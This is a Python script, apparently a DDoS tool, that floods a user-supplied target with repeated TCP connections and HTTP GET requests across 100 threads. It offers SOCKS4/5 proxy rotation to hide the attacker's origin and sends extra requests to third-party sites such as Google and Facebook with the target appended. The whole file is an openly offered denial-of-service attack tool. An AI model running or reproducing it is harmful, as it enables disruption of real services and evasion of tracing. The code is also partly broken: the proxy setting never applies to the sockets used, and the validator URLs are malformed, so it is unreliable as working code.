#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
import time
import socket
import threading
import logging
import urllib.request
import random
import argparse
import signal
import os
from datetime import datetime
import socks

# Terminal colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ENDC = '\033[0m'

# Banner
def print_banner():
    banner = f"""
{Colors.CYAN}
███╗   ███╗ █████╗ ██╗     
████╗ ████║██╔══██╗██║     
██╔████╔██║███████║██║     
██║╚██╔╝██║██╔══██║██║     
██║ ╚═╝ ██║██║  ██║███████╗
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝
{Colors.ENDC}
{Colors.MAGENTA}                    © Daniel-191{Colors.ENDC}
"""
    print(banner)

# User agents for requests
def user_agent():
    uagent = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    ]
    return uagent

# Validator URLs
def validators():
    return [
        "http://httpbin.org/ip",
        "http://httpbin.org/user-agent",
        "http://httpbin.org/headers",
        "http://www.google.com/",
        "http://www.github.com/",
        "http://www.stackoverflow.com/",
        "http://www.reddit.com/",
        "http://www.youtube.com/",
        "http://www.facebook.com/",
        "http://www.twitter.com/",
    ]

# Read proxies from file
def read_proxies(proxy_file):
    proxies = []
    try:
        with open(proxy_file, 'r') as f:
            for line in f:
                proxy = line.strip()
                if proxy:
                    proxies.append(proxy)
    except FileNotFoundError:
        print(f"{proxy_file} not found. No proxies loaded.")
    return proxies

# Parse proxy string into type, host, and port
def parse_proxy(proxy_str):
    if proxy_str.startswith('socks4://'):
        proxy_type = socks.SOCKS4
        host_port = proxy_str[9:]
    elif proxy_str.startswith('socks5://'):
        proxy_type = socks.SOCKS5
        host_port = proxy_str[10:]
    else:
        print(f"Invalid proxy format: {proxy_str}")
        return None, None, None
    try:
        host, port = host_port.split(':', 1)
        port = int(port)
    except ValueError:
        print(f"Invalid proxy format (host or port): {proxy_str}")
        return None, None, None
    return proxy_type, host, port

def dos_thread(target, port, uagent_list, data, thread_id, proxies):
    while True:
        try:
            if proxies:
                proxy = random.choice(proxies)
                proxy_type, proxy_host, proxy_port = parse_proxy(proxy)
                if not all([proxy_type, proxy_host, proxy_port]):
                    continue

                socks.set_default_proxy(proxy_type, proxy_host, proxy_port)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, int(port)))
            s.sendall(data.encode())
            s.close()
        except Exception as e:
            print(f"[Thread {thread_id}] Error: {e}")

def validator_thread(validator_url, uagent_list, thread_id, proxies):
    try:
        opener = None

        if proxies:
            proxy = random.choice(proxies)
            proxy_type, proxy_host, proxy_port = parse_proxy(proxy)

            if not all([proxy_type, proxy_host, proxy_port]):
                print(f"[Thread {thread_id}] Invalid proxy format")
                return

            proxy_str = f"{proxy_type}://{proxy_host}:{proxy_port}"

            proxy_handler = urllib.request.ProxyHandler({
                "http": proxy_str,
                "https": proxy_str
            })

            opener = urllib.request.build_opener(proxy_handler)
        else:
            opener = urllib.request.build_opener()

        req = urllib.request.Request(validator_url)
        req.add_header("User-Agent", random.choice(uagent_list))

        with opener.open(req, timeout=10) as response:
            response.read()

    except Exception as e:
        print(f"[Thread {thread_id}] Validator Error: {e}")

def signal_handler(sig, frame):
    print(f'\n{Colors.YELLOW}Received SIGINT, shutting down gracefully...{Colors.ENDC}')
    sys.exit(0)

# Main function
def main():
    parser = argparse.ArgumentParser(description="DDoS Script with optional SOCKS support.")
    parser.add_argument("target", help="Target URL or IP address")
    parser.add_argument("-socks4", action="store_true", help="Use SOCKS4 proxies from socks4.txt")
    parser.add_argument("-socks5", action="store_true", help="Use SOCKS5 proxies from socks5.txt")
    args = parser.parse_args()

    # Load proxies
    proxy_files = []
    if args.socks4:
        proxy_files.append('socks4.txt')
    if args.socks5:
        proxy_files.append('socks5.txt')

    proxies = []
    for file in proxy_files:
        proxies.extend(read_proxies(file))

    # Example data and validator URLs
    uagent_list = user_agent()
    validator_list = validators()

    target = args.target
    port = 80
    num_threads = 100
    data = "GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"

    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)

    logging.info(f"{Colors.BLUE}Starting attack on {target}:{port} with {num_threads} threads{Colors.ENDC}")

    # Create threads
    threads = []

    # Create socket threads
    for i in range(num_threads // 2):
        t = threading.Thread(target=dos_thread, args=(target, port, uagent_list, data, i, proxies))
        t.daemon = True
        t.start()
        threads.append(t)

    # Create validator threads
    for i in range(num_threads // 2):
        validator_url = random.choice(validator_list) + target
        t = threading.Thread(target=validator_thread, args=(validator_url, uagent_list, i, proxies))
        t.daemon = True
        t.start()
        threads.append(t)

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f'\n{Colors.YELLOW}Shutting down...{Colors.ENDC}')
        sys.exit(0)

if __name__ == "__main__":
    main()